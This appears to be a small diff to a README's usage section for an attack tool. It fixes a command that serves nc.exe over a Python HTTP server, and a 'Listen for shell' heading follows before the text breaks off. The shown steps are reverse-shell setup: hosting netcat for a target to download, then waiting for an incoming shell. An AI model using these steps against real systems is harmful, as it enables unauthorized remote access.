@@ -1,7 +1,7 @@
 # How To Use
 ## Serve nc.exe
 ```
-python3 -m http.server -d . ^&
+python3 -m http.server -d . &
 ```
 ## Listen for shell
 ```
